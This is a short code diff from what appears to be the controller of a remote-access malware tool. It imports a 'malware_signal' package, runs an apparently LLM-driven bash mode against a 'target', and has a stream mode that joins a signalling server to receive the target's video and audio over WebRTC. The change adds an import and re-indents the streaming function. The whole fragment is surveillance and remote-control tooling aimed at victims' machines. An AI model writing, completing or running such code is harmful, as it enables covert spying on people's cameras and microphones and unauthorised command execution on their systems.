@@ -3,6 +3,7 @@ import asyncio
 import cv2
 from ai_utils.ai import _fallback_command, _extract_command_text
 from core.ai.groq.groq_provider import GroqProvider
+from malware_signal import peer
 from malware_signal.peer import Peer
 from malware_signal.signal import SignalClient
 from core.data.config import HOST, ROOM
@@ -97,21 +98,21 @@ async def ai_bash_mode(target, prompt, provider=None):
         await signal.close()
 
 
-    async def stream_mode(target):
-        print("[+] CONNECTING TO STREAM")
+async def stream_mode(target):
+    print("[+] CONNECTING TO STREAM")
 
-        signal = SignalClient(room=ROOM, client_id=client_id, host=HOST, username=username)
-        await signal.connect()
+    signal = SignalClient(room=ROOM, client_id=client_id, host=HOST, username=username)
+    await signal.connect()
 
-        peer = Peer(signal)
-        stop_event = asyncio.Event()
+    peer = Peer(signal)
+    stop_event = asyncio.Event()
 
-        peer.pc.addTransceiver("video", direction="recvonly")
-        peer.pc.addTransceiver("audio", direction="recvonly")
+    peer.pc.addTransceiver("video", direction="recvonly")
+    peer.pc.addTransceiver("audio", direction="recvonly")
 
-        async def track_handler(track):
-            print("[+] INCOMING REMOTE TRACK, SCHEDULING DISPLAY TASK")
-            await show_video(track, stop_event)
+    async def track_handler(track):
+        print("[+] INCOMING REMOTE TRACK, SCHEDULING DISPLAY TASK")
+        await show_video(track, stop_event)
 
         peer.on_track = track_handler
 
